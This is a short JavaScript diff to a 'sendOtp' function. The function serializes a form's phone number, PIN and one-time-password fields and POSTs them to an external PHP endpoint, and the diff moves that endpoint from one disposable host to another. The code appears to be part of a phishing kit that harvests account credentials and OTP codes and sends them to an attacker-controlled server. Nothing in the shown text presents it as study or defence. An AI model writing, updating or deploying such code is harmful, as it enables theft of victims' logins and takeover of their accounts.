@@ -60,7 +60,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://3s0k.koyeb.app/ii/three.php',
+      url: 'https://choreo.ii-fi.cfd/3s0k/ii/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
